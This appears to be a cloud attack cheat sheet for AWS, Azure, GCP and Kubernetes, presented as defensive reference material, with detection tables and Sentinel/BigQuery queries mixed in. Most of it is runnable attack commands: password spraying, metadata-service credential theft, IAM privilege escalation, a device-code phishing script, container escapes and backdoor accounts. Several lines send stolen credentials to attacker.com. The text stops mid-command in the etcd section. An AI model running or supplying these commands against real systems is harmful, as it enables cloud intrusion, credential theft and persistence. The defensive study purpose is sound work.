# Cloud Attack Reference

> Comprehensive cloud attack techniques for AWS, Azure, and GCP — aligned to MITRE ATT&CK for Cloud.  
> **For defensive security engineers and incident responders: understand attacker techniques to build better detections and controls.**

---

## Table of Contents

1. [Cloud Attack Taxonomy & Initial Access](#1-cloud-attack-taxonomy--initial-access)
2. [AWS Attack Techniques](#2-aws-attack-techniques)
3. [Azure Attack Techniques](#3-azure-attack-techniques)
4. [GCP Attack Techniques](#4-gcp-attack-techniques)
5. [Container & Kubernetes Attacks](#5-container--kubernetes-attacks)
6. [Serverless & PaaS Attacks](#6-serverless--paas-attacks)
7. [Cloud Lateral Movement & Persistence](#7-cloud-lateral-movement--persistence)
8. [Data Exfiltration from Cloud](#8-data-exfiltration-from-cloud)
9. [Cloud-Specific Exploitation](#9-cloud-specific-exploitation)
10. [Cloud Security Posture & Detection](#10-cloud-security-posture--detection)

---

## 1. Cloud Attack Taxonomy & Initial Access

### MITRE ATT&CK for Cloud Coverage

ATT&CK for Cloud spans three matrices: **IaaS** (covering AWS, Azure, GCP, OCI), **SaaS** (Microsoft 365, Google Workspace, Salesforce), and **Containers** (Kubernetes, Docker). Key tactic-level mappings:

| ATT&CK Tactic | Cloud Manifestation | Key Technique IDs |
|---|---|---|
| Initial Access | Credential theft, misconfigured services, phishing | T1190, T1566, T1078, T1552 |
| Execution | Lambda invocation, SSM Run Command, cloud console | T1651, T1059 |
| Persistence | IAM backdoors, resource policy modification | T1098, T1546 |
| Privilege Escalation | IAM policy manipulation, role chaining | T1078.004, T1548 |
| Defense Evasion | Disable logging, operate in uncovered region | T1562, T1211 |
| Credential Access | IMDS abuse, secrets manager, stored credentials | T1552.005, T1528 |
| Discovery | IAM enum, resource listing, org enumeration | T1087, T1069, T1518 |
| Lateral Movement | Cross-account role assumption, federation abuse | T1021, T1550 |
| Collection | S3 bucket read, database export, secrets retrieval | T1530, T1213 |
| Exfiltration | Sync to external bucket, snapshot sharing | T1537 |
| Impact | Ransomware on S3, resource deletion, crypto mining | T1485, T1496 |

### Cloud-Specific Initial Access Vectors

#### Exposed Credentials

**GitHub Secrets and Leaked API Keys**

Attackers continuously scan public repositories and code hosting platforms for committed cloud credentials:

```bash
# Tools used by attackers to scan for secrets
trufflehog git https://github.com/target/repo --only-verified
gitleaks detect --source=/path/to/repo --report-format json
git-secrets --scan-history

# GitHub dork patterns for AWS keys
# site:github.com "AKIA" "secret_access_key"
# site:pastebin.com "AKIA" filetype:txt

# Validate found credentials before alerting
aws sts get-caller-identity --profile suspected_leaked
```

Detection: AWS GuardDuty finding `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` triggers when credentials issued to EC2 instances are used from external IPs. CloudTrail event `ConsoleLogin` from unexpected geolocation + `GetCallerIdentity` calls from new IPs/ASNs are key indicators.

**Misconfigured S3 Buckets**

```bash
# Unauthenticated bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Mass scanner tools
python3 S3Scanner.py --bucket-list targets.txt
bucket_finder.rb wordlist.txt

# Check for common credential locations within buckets
aws s3 cp s3://target/.env . --no-sign-request
aws s3 cp s3://target/credentials . --no-sign-request
aws s3 cp s3://target/terraform.tfstate . --no-sign-request
```

CloudTrail detection: `GetObject` events with `userIdentity.type = Anonymous` or `userIdentity.accountId = anonymous`. GuardDuty: `Policy:S3/BucketPublicAccessGranted`, `Discovery:S3/BucketEnumeration.Unusual`.

**.env Files and CI/CD Pipeline Secrets**

Common patterns: `.env` files with `AWS_ACCESS_KEY_ID`, `GOOGLE_APPLICATION_CREDENTIALS` pointing to JSON files baked into Docker images, `AZURE_CLIENT_SECRET` in GitHub Actions workflow YAML. Terraform state files (`terraform.tfstate`) frequently contain plaintext credentials and resource details used during provisioning.

#### Credential Stuffing and MFA Bypass

**Password Spraying Against Cloud Identity Providers**

```bash
# AWS Console IAM user spray (low and slow)
# Tools: credmaster, aws_consoler
python3 spray.py --userlist emails.txt --password 'Summer2024!' --service aws

# Azure / Entra ID spraying
MSOLSpray -UserList users.txt -Password 'Company2024!' -Delay 30 -Verbose
Invoke-Spray365 -UserList users.txt -PasswordList passwords.txt -OutFile results.csv

# GCP / Google Workspace
python3 gcp-spray.py --users users.txt --password 'Password123'
```

**MFA Bypass Techniques**

- **Adversary-in-the-Middle (AiTM)**: Proxy (evilginx2, Modlishka) intercepts authentication flow and captures session cookies post-MFA, enabling replay attacks without re-triggering MFA.
- **OAuth Device Code Phishing**: Attacker generates device code, sends victim to `https://microsoft.com/devicelogin` with the code, victim authenticates and grants attacker persistent access token without MFA re-challenge.
- **Authenticator App Fatigue**: Repeated MFA push notifications until user approves to stop the noise.
- **SIM Swapping**: Target SMS-based MFA by porting victim's phone number.

#### SSRF to Instance Metadata Service (IMDS)

```bash
# Classic IMDSv1 SSRF exploitation
# Vulnerable endpoint: http://vulnerable-app.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Returns role name e.g.: my-ec2-role
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role"
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# GCP IMDS via SSRF
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure IMDS via SSRF
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata:true"
```

#### Supply Chain to Cloud (CI/CD Pipeline Attacks)

Attackers compromise CI/CD systems to steal cloud credentials or inject malicious infrastructure code:
- Compromise GitHub Actions workflow to exfiltrate `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY` secrets
- Inject malicious Terraform modules that create backdoor IAM users
- Compromise npm/PyPI packages imported by cloud infrastructure code
- Target self-hosted runners with access to cloud environments

Detection: CloudTrail events showing resource creation from unusual IAM principals, `AssumeRoleWithWebIdentity` calls from unexpected OIDC issuers, new IAM users created by CI service accounts.

### GuardDuty Initial Access Finding Types

| GuardDuty Finding | Indicates |
|---|---|
| `UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B` | Console login from unusual location |
| `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` | EC2 credentials used from external IP |
| `Discovery:S3/BucketEnumeration.Unusual` | Unusual S3 bucket discovery activity |
| `Policy:S3/BucketPublicAccessGranted` | Bucket made publicly accessible |
| `UnauthorizedAccess:IAMUser/MaliciousIPCaller` | API calls from known malicious IP |
| `PenTest:IAMUser/KaliLinux` | Calls from Kali Linux user agent |
| `CredentialAccess:IAMUser/AnomalousBehavior` | ML-detected credential access anomaly |

---

## 2. AWS Attack Techniques

### Credential Theft and Enumeration

```bash
# Verify identity after obtaining credentials
aws sts get-caller-identity
# Returns: UserId, Account, Arn

# Enumerate current permissions (no direct API; use bruteforce approach)
# Pacu module for permission enumeration
python3 pacu.py
# > import_keys ACCESS_KEY SECRET_KEY TOKEN
# > run iam__enum_permissions
# > run iam__privesc_scan

# Manual IAM enumeration
aws iam list-users
aws iam list-roles
aws iam list-groups
aws iam list-policies --scope Local
aws iam get-account-authorization-details \
  --filter User Group Role LocalManagedPolicy AWSManagedPolicy

# Get user-specific policies
aws iam list-user-policies --user-name TARGET_USER
aws iam list-attached-user-policies --user-name TARGET_USER
aws iam list-groups-for-user --user-name TARGET_USER

# Enumerate accessible S3 buckets
aws s3 ls
aws s3api list-buckets
aws s3 ls --no-sign-request s3://target-bucket  # unauthenticated

# EC2 enumeration
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,IamInstanceProfile.Arn]'
aws ec2 describe-security-groups
aws ec2 describe-vpcs

# Secrets and parameters
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id TARGET_SECRET
aws ssm describe-parameters
aws ssm get-parameter --name /prod/db/password --with-decryption
```

**Pacu Modules for Enumeration**

| Module | Purpose |
|---|---|
| `iam__enum_permissions` | Enumerate all permissions for current principal |
| `iam__privesc_scan` | Identify privilege escalation paths |
| `ec2__enum` | Enumerate EC2 instances, SGs, VPCs |
| `s3__bucket_finder` | Find accessible S3 buckets |
| `secretsmanager__enum` | List and retrieve secrets |
| `lambda__enum` | Enumerate Lambda functions and configs |
| `ecs__enum_task_def` | Enumerate ECS task definitions for secrets |

### IAM Privilege Escalation Paths

```bash
# Path 1: iam:CreatePolicyVersion
# Create a new policy version with admin permissions
aws iam create-policy-version \
  --policy-arn arn:aws:iam::ACCOUNT:policy/TARGET_POLICY \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:PassRole + ec2:RunInstances
# Launch EC2 with high-privilege role, retrieve credentials via user-data
aws ec2 run-instances \
  --image-id ami-0abcdef1234567890 \
  --instance-type t2.micro \
  --iam-instance-profile Name=ADMIN_ROLE \
  --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ADMIN_ROLE > /tmp/creds
curl -d @/tmp/creds https://attacker.com/exfil'

# Path 3: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/ADMIN_ROLE \
  --handler index.handler \
  --zip-file fileb://evil.zip

aws lambda invoke --function-name backdoor /tmp/output.json

# Path 4: iam:CreateLoginProfile (escalate to console access)
aws iam create-login-profile \
  --user-name ADMIN_USER \
  --password 'Backdoor2024!' \
  --no-password-reset-required

# Path 5: iam:CreateAccessKey (create programmatic access for another user)
aws iam create-access-key --user-name ADMIN_USER

# Path 6: sts:AssumeRole chaining across accounts
aws sts assume-role \
  --role-arn arn:aws:iam::ACCOUNT_B:role/CrossAccountRole \
  --role-session-name attacker-session
# Use returned credentials to assume role in account C, etc.

# Path 7: UpdateLoginProfile (reset another user's console password)
aws iam update-login-profile --user-name ADMIN_USER --password 'NewPass2024!'

# Path 8: lambda:UpdateFunctionCode + lambda:InvokeFunction (steal execution role creds)
cat > evil.py << 'EOF'
import boto3, requests
def handler(event, context):
    creds = boto3.client('sts').get_caller_identity()
    requests.post('https://attacker.com', json=creds)
EOF
zip evil.zip evil.py
aws lambda update-function-code --function-name TARGET --zip-file fileb://evil.zip
aws lambda invoke --function-name TARGET /tmp/out.json
```

### SSRF to IMDSv1 and IMDSv2 Enforcement

```bash
# IMDSv1 — no token required (legacy, dangerous)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Get role name then retrieve temporary credentials:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 — requires PUT request to get session token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Enforce IMDSv2 on existing instances
aws ec2 modify-instance-metadata-options \
  --instance-id i-XXXXXXXXXX \
  --http-tokens required \
  --http-endpoint enabled

# Enforce IMDSv2 via SCP (organization-wide)
# Deny launch of instances without IMDSv2 enforcement
```

### Persistence Mechanisms

```bash
# Create hidden IAM user
aws iam create-user --user-name backup-svc
aws iam attach-user-policy \
  --user-name backup-svc \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup-svc

# Add access key to existing admin user (creates second key)
aws iam create-access-key --user-name legitimate-admin

# Lambda backdoor triggered by EventBridge
aws events put-rule \
  --name daily-backup \
  --schedule-expression 'rate(1 day)' \
  --state ENABLED
aws events put-targets \
  --rule daily-backup \
  --targets '[{"Id":"1","Arn":"arn:aws:lambda:us-east-1:ACCOUNT:function:backdoor"}]'

# Modify cross-account role trust policy
aws iam update-assume-role-policy \
  --role-name ADMIN_ROLE \
  --policy-document '{
    "Statement":[{
      "Effect":"Allow",
      "Principal":{"AWS":"arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action":"sts:AssumeRole"
    }]
  }'

# SSM document execution backdoor
aws ssm create-document \
  --name "AWSSupport-DiagnosticTool" \
  --document-type Command \
  --content file://malicious-doc.json
```

### CloudTrail Detection Events for AWS Attacks

| Technique | CloudTrail Event | Key Fields to Alert |
|---|---|---|
| New IAM user | `CreateUser` | `requestParameters.userName` not in baseline |
| New access key | `CreateAccessKey` | `requestParameters.userName` != `userIdentity.userName` |
| Password set | `CreateLoginProfile`, `UpdateLoginProfile` | Unexpected `userName` |
| Admin policy attach | `AttachUserPolicy`, `AttachRolePolicy` | `policyArn` contains `AdministratorAccess` |
| Policy version creation | `CreatePolicyVersion` | `setAsDefault=true` + broad permissions |
| CloudTrail disable | `StopLogging`, `DeleteTrail` | Any occurrence |
| New console login | `ConsoleLogin` | From new IP/geo, unexpected user |
| Cross-account assume | `AssumeRole` | `principalId` from external account |
| Secrets access | `GetSecretValue` | From unexpected principal |
| GuardDuty disable | `DeleteDetector`, `UpdateDetector` | Any occurrence |

### GuardDuty Finding Types — AWS

| Finding Type | Severity | Description |
|---|---|---|
| `Backdoor:EC2/C&CActivity.B` | High | EC2 communicating with known C2 |
| `Behavior:EC2/TrafficVolumeUnusual` | Medium | Unusual outbound traffic volume |
| `CryptoCurrency:EC2/BitcoinTool.B` | High | Crypto mining indicators |
| `Impact:IAMUser/AnomalousBehavior` | High | ML-detected unusual IAM behavior |
| `Persistence:IAMUser/UserPermissions` | Medium | IAM permissions change |
| `PrivilegeEscalation:IAMUser/AdministrativePermissions` | High | Attempted privilege escalation |
| `Recon:IAMUser/MaliciousIPCaller` | Medium | API calls from malicious IP |
| `Stealth:IAMUser/CloudTrailLoggingDisabled` | High | CloudTrail disabled |
| `Stealth:IAMUser/PasswordPolicyChange` | Low | Account password policy weakened |
| `UnauthorizedAccess:EC2/SSHBruteForce` | Low | SSH brute force against EC2 |

---

## 3. Azure Attack Techniques

### Azure AD / Entra ID Enumeration

```powershell
# ROADtools — comprehensive Azure AD enumeration
pip install roadtools
roadrecon gather -u user@domain.com -p Password123
roadrecon gui  # Web interface to browse results

# AzureHound — BloodHound for Azure
./azurehound -u user@domain.com -p Password123 list --tenant TENANT_ID -o azurehound_output.json
# Import into BloodHound for attack path visualization

# AADInternals — deep Azure AD manipulation
Import-Module AADInternals

# Enumerate tenant information (no auth required)
Get-AADIntTenantID -Domain "target.com"
Get-AADIntOpenIDConfiguration -Domain "target.com"

# After obtaining access token
$token = Get-AADIntAccessToken -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" -Tenant TENANT_ID
Get-AADIntUsers -AccessToken $token
Get-AADIntGroups -AccessToken $token
Get-AADIntServicePrincipals -AccessToken $token
Get-AADIntApplications -AccessToken $token

# GraphRunner — Microsoft Graph enumeration
Import-Module GraphRunner
Invoke-GraphRecon -Tokens $tokens -PermissionEnum
Invoke-DumpApps -Tokens $tokens
```

### Token Theft Techniques

**Device Code Phishing**

```powershell
# Step 1: Attacker generates device code
$body = @{
    client_id = "1b730954-1685-4b74-9bfd-dac224a7b894"  # Microsoft Azure PowerShell
    scope = "https://graph.microsoft.com/.default offline_access"
}
$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Method POST -Body $body

# Step 2: Send victim to: https://microsoft.com/devicelogin with user_code
Write-Host "Send this to victim: $($response.user_code)"
Write-Host "Victim URL: $($response.verification_uri)"

# Step 3: Poll for token after victim authenticates
$poll_body = @{
    grant_type = "urn:ietf:params:oauth:grant-type:device_code"
    client_id = "1b730954-1685-4b74-9bfd-dac224a7b894"
    device_code = $response.device_code
}
$token = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method POST -Body $poll_body
```

**Primary Refresh Token (PRT) Extraction**

```powershell
# Extract PRT from Azure AD joined Windows device (requires local admin)
Import-Module AADInternals
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName cert.pfx
$PRT = New-AADIntUserPRTToken -Settings $prtKeys

# Use PRT to get access token for any Microsoft resource
$token = Get-AADIntAccessTokenWithPRT -PRTToken $PRT `
  -Resource "https://management.azure.com/" -ClientId "1b730954-..."

# Token replay — inject stolen token into browser
# Chrome SSO cookies for office.com, portal.azure.com
```

### Azure RBAC Privilege Escalation

```bash
# Enumerate role assignments
az role assignment list --all --output table
az role definition list --custom-role-only true

# Escalation path 1: User Access Administrator -> assign Owner to self
az role assignment create \
  --assignee ATTACKER_OBJECT_ID \
  --role Owner \
  --scope /subscriptions/SUBSCRIPTION_ID

# Escalation path 2: Contributor role -> create automation runbook with creds
az automation runbook create \
  --automation-account-name TARGET_ACCOUNT \
  --resource-group TARGET_RG \
  --name backdoor-runbook \
  --type PowerShell
# Edit and publish with credential-stealing code

# Privileged Identity Management (PIM) abuse
# Activate eligible role assignment without proper justification
az rest --method POST \
  --uri "https://management.azure.com/providers/Microsoft.Authorization/roleAssignmentScheduleRequests/REQUEST_ID?api-version=2020-10-01" \
  --body '{"properties":{"requestType":"SelfActivate","linkedRoleEligibilityScheduleId":"...","justification":"Routine maintenance"}}'

# Managed Identity abuse from Azure VM
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H 'Metadata:true'
# Use returned token to call Azure Resource Manager API
```

### Service Principal Attacks

```bash
# Enumerate service principals and their credentials
az ad sp list --all --query '[].{Name:displayName,AppId:appId,ObjectId:id}' --output table
az ad sp credential list --id APP_OBJECT_ID

# Service principal password spraying
# Using Fireprox to rotate IPs against Azure AD token endpoint
python3 fireprox.py --command create --url https://login.microsoftonline.com
# Spray against /oauth2/v2.0/token endpoint with client_credentials grant

# Key Vault access via Service Principal
az keyvault secret list --vault-name TARGET_VAULT
az keyvault secret show --vault-name TARGET_VAULT --name SECRET_NAME
az keyvault key list --vault-name TARGET_VAULT

# Storage account SAS token generation (if Contributor+ on storage)
az storage account generate-sas \
  --account-name STORAGE_ACCOUNT \
  --expiry 2025-12-31 \
  --permissions rwdlacup \
  --resource-types sco \
  --services bfqt
```

### Azure Detection: Unified Audit Log and Sign-in Logs

**KQL Queries for Microsoft Sentinel**

```kql
// Suspicious OAuth consent grant
AuditLogs
| where OperationName == "Consent to application"
| where Result == "success"
| extend AppName = tostring(TargetResources[0].displayName)
| extend ConsentedBy = tostring(InitiatedBy.user.userPrincipalName)
| where AppName !in (known_trusted_apps)
| project TimeGenerated, ConsentedBy, AppName, AdditionalDetails

// Device code authentication (potential phishing)
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| where ResultType == 0  // Success
| project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName

// PIM role activation anomaly
AuditLogs
| where Category == "RoleManagement"
| where OperationName contains "Add member to role completed (PIM activation)"
| extend Role = tostring(TargetResources[0].displayName)
| extend ActivatedBy = tostring(InitiatedBy.user.userPrincipalName)
| where Role in ("Global Administrator", "Privileged Role Administrator", "Security Administrator")

// Suspicious credential addition to Service Principal
AuditLogs
| where OperationName in ("Add service principal credentials", "Update application – Certificates and secrets management")
| extend Actor = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetApp = tostring(TargetResources[0].displayName)
| project TimeGenerated, Actor, TargetApp, OperationName

// Mass mail access (post-compromise OAuth app)
OfficeActivity
| where Operation == "MailItemsAccessed"
| summarize MailboxCount = dcount(MailboxOwnerUPN) by ClientAppId, ClientIPAddress
| where MailboxCount > 10
| sort by MailboxCount desc
```

### Microsoft Defender for Cloud Alerts

| Alert | Description |
|---|---|
| `AZURE_SUSPICIOUS_MANAGEMENT_SESSION` | Unusual management operations from new location |
| `AZURE_PIM_SUSPICIOUS_ACTIVATION` | Suspicious PIM role activation pattern |
| `AZURE_UNFAMILIAR_LOCATION_SIGNIN` | Sign-in from unfamiliar location |
| `AZURE_ANOMALOUS_ACCESS_TOKEN_USAGE` | Anomalous OAuth token usage pattern |
| `AZURE_STORAGE_ACCOUNT_UNUSUAL_ACCESS` | Unusual access pattern to storage |
| `AZURE_KEY_VAULT_SUSPICIOUS_ACCESS` | Suspicious Key Vault access attempt |

---

## 4. GCP Attack Techniques

### GCP IAM Enumeration

```bash
# Identify current identity and project
gcloud auth list
gcloud config list project
gcloud projects list

# IAM policy enumeration
gcloud projects get-iam-policy PROJECT_ID
gcloud organizations get-iam-policy ORG_ID

# List grantable roles (what roles can be assigned on a resource)
gcloud iam list-grantable-roles //cloudresourcemanager.googleapis.com/projects/PROJECT_ID

# Test permissions without actually calling them (audit logs still generated)
# Uses iam.testIamPermissions — check if you have specific permissions
gcloud projects test-iam-permissions PROJECT_ID \
  --permissions "iam.serviceAccounts.actAs,compute.instances.create,storage.buckets.list"

# Service account enumeration
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy SA_EMAIL

# List available service account keys
gcloud iam service-accounts keys list --iam-account=SA_EMAIL
```

### Service Account Key Theft

```bash
# From GCS buckets — common mistake: storing JSON key files in accessible buckets
gsutil ls gs://TARGET_BUCKET/
gsutil cp gs://TARGET_BUCKET/service-account-key.json .

# From metadata server (running on GCP instance)
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Returns: access_token, expires_in, token_type

curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Using stolen JSON key
gcloud auth activate-service-account --key-file=stolen-key.json
gcloud config set project TARGET_PROJECT

# Enumerate what the service account can do
gcloud projects get-iam-policy PROJECT_ID --format=json | \
  python3 -c "import json,sys; p=json.load(sys.stdin); \
  [print(b['role'], b['members']) for b in p['bindings'] if 'SA_EMAIL' in str(b['members'])]"
```

### GCP Privilege Escalation Paths

```bash
# Path 1: iam.serviceAccounts.actAs -> impersonate high-privilege SA
# Requires actAs on target SA
gcloud auth print-access-token --impersonate-service-account=admin-sa@PROJECT.iam.gserviceaccount.com

# Path 2: cloudfunctions.functions.create + iam.serviceAccounts.actAs
# Create Cloud Function running as high-privilege SA
gcloud functions deploy backdoor \
  --runtime python39 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account admin-sa@PROJECT.iam.gserviceaccount.com \
  --entry-point exfil \
  --source .

# Path 3: compute.instances.create + iam.serviceAccounts.actAs
gcloud compute instances create attacker-vm \
  --service-account admin-sa@PROJECT.iam.gserviceaccount.com \
  --scopes https://www.googleapis.com/auth/cloud-platform \
  --zone us-central1-a
# SSH into instance, curl metadata server for admin SA token

# Path 4: iam.serviceAccountKeys.create (create persistent key for SA)
gcloud iam service-accounts keys create attacker-key.json \
  --iam-account admin-sa@PROJECT.iam.gserviceaccount.com

# Path 5: roles/editor -> create new SA with roles/owner
gcloud iam service-accounts create evil-sa \
  --display-name "Monitoring Service"
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member "serviceAccount:evil-sa@PROJECT.iam.gserviceaccount.com" \
  --role "roles/owner"
gcloud iam service-accounts keys create evil-key.json \
  --iam-account evil-sa@PROJECT.iam.gserviceaccount.com
```

### GCS Bucket Public Access

```bash
# Check bucket public access configuration
gsutil iam get gs://TARGET_BUCKET
gsutil ls -L -b gs://TARGET_BUCKET

# Public bucket enumeration (no authentication)
curl https://storage.googleapis.com/TARGET_BUCKET/
curl https://storage.googleapis.com/TARGET_BUCKET/?list-type=2  # List objects

# Enumerate with authenticated user (broad access via allUsers or allAuthenticatedUsers)
gsutil ls gs://TARGET_BUCKET/
gsutil cp -r gs://TARGET_BUCKET/ /tmp/loot/

# Workload Identity Federation abuse
# If trust configuration is overly permissive (allows any token from external OIDC)
# Attacker can generate valid token from allowed external IdP to impersonate SA
```

### GCP Detection: Cloud Audit Logs

**Types:**
- **Admin Activity** (always enabled, free): Create/delete/modify resources, IAM changes
- **Data Access** (optional, charged): Read operations, data reads, user-driven access
- **System Event**: GCP system-generated events
- **Policy Denied**: Requests blocked by organization policy

**Cloud Logging / Chronicle Queries**

```sql
-- Service account key creation (potential persistence)
SELECT timestamp, protopayload_auditlog.authenticationInfo.principalEmail,
       protopayload_auditlog.resourceName
FROM `PROJECT.DATASET.cloudaudit_googleapis_com_activity`
WHERE protopayload_auditlog.methodName = "google.iam.admin.v1.CreateServiceAccountKey"
  AND timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)

-- Unusual metadata server access pattern (SSRF indicator in Cloud Run/Functions)
SELECT timestamp, resource.labels.function_name, httpRequest.remoteIp
FROM `PROJECT.DATASET.run_googleapis_com_requests`
WHERE httpRequest.requestUrl LIKE "%metadata.google.internal%"

-- IAM policy modification
SELECT timestamp, protopayload_auditlog.authenticationInfo.principalEmail,
       protopayload_auditlog.methodName, protopayload_auditlog.resourceName
FROM `PROJECT.DATASET.cloudaudit_googleapis_com_activity`
WHERE protopayload_auditlog.methodName IN (
  "SetIamPolicy", "google.iam.admin.v1.CreateServiceAccount",
  "google.iam.admin.v1.CreateServiceAccountKey"
)
ORDER BY timestamp DESC
```

### Security Command Center Findings

| Finding Category | Finding Name | Description |
|---|---|---|
| THREAT | `DEFENSE_EVASION_DISABLE_LOGGING` | Audit logging disabled |
| THREAT | `PERSISTENCE_NEW_API_KEY` | New API key created |
| THREAT | `CREDENTIAL_ACCESS_SECRETMANAGER` | Unusual Secret Manager access |
| VULNERABILITY | `PUBLIC_BUCKET_ACL` | GCS bucket publicly accessible |
| VULNERABILITY | `OVER_PRIVILEGED_SERVICE_ACCOUNT` | SA with owner/editor role |
| MISCONFIGURATION | `OPEN_FIREWALL_RULE` | Firewall rule allows 0.0.0.0/0 |

---

## 5. Container & Kubernetes Attacks

### Unauthenticated Kubernetes API Server

```bash
# Check if API server is open (should return 403, not 401 or open)
curl -k https://K8S_API_SERVER:6443/api/v1/namespaces/default/pods

# Enumerate cluster resources with anonymous auth
kubectl --insecure-skip-tls-verify=true -s https://K8S_API_SERVER:6443 get pods -A
kubectl --insecure-skip-tls-verify=true -s https://K8S_API_SERVER:6443 get secrets -A

# Steal service account token from compromised pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
echo $KUBERNETES_SERVICE_HOST

# Use stolen token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN --insecure-skip-tls-verify=true \
  -s https://kubernetes.default.svc get pods -A

# kubeconfig exfiltration (from compromised CI/CD or developer workstation)
cat ~/.kube/config  # Contains cluster endpoint, CA cert, and auth token or cert
```

### Container Escape Techniques

**Privileged Container Escape**

```bash
# Check if running privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff (full capabilities = privileged)

# Mount host filesystem via privileged container
fdisk -l  # Find host disk
mkdir /mnt/host
mount /dev/xvda1 /mnt/host
chroot /mnt/host sh
# Now operating as root on host OS

# Read sensitive host files
cat /mnt/host/etc/shadow
cat /mnt/host/var/lib/kubelet/kubeconfig
cat /mnt/host/etc/kubernetes/admin.conf
```

**Host PID Namespace Escape**

```bash
# If hostPID: true in pod spec
# View all processes on host
ps aux  # See host processes

# Inject into host init process (PID 1)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Now in host namespaces with root privileges
```

**Docker Socket Mount**

```bash
# Check if docker.sock is mounted
ls -la /var/run/docker.sock

# Use docker client to escape
docker -H unix:///var/run/docker.sock run \
  -v /:/host \
  -it alpine \
  chroot /host sh

# Or create privileged container from within compromised container
docker -H unix:///var/run/docker.sock run \
  --privileged \
  --pid=host \
  -it ubuntu \
  nsenter -t 1 -m -u -i -n -p -- bash
```

**Dangerous Capabilities**

```bash
# CAP_SYS_ADMIN — most dangerous, many escape paths
# Mount host filesystem:
mkdir /mnt/cgroup && mount -t cgroup -o memory cgroup /mnt/cgroup
# Or use overlay/fuse mounts to access host

# CAP_NET_ADMIN — network manipulation
# Set up network tap to intercept cluster traffic
ip link add dummy0 type dummy
tcpdump -i any -w /tmp/capture.pcap

# Writable hostPath volumes
# Pod spec with: hostPath: path: /etc  type: Directory
# Mount /etc from host, write to /etc/cron.d for persistence
echo "* * * * * root curl https://attacker.com/$(hostname)" > /etc/cron.d/heartbeat
```

### Kubernetes RBAC Abuse

```bash
# Enumerate current RBAC permissions
kubectl auth can-i --list
kubectl auth can-i --list --namespace kube-system

# Common escalation: pod/exec + privileged pod creation = cluster-admin
# If SA has pods/exec: attach to privileged pod
kubectl exec -it privileged-pod -- /bin/bash

# If SA has create pods: create privileged pod
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: kube-system
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    command: ["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","bash"]
    securityContext:
      privileged: true
  serviceAccountName: default
EOF

# ClusterRoleBinding escalation
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:compromised-sa

# DaemonSet persistence (runs on every node)
kubectl create daemonset node-monitor \
  --image=attacker/beacon:latest
```

### etcd Direct Access

```bash
# etcd contains all cluster secrets unencrypted (unless encryption at rest enabled)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only

# Extract specific secret
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
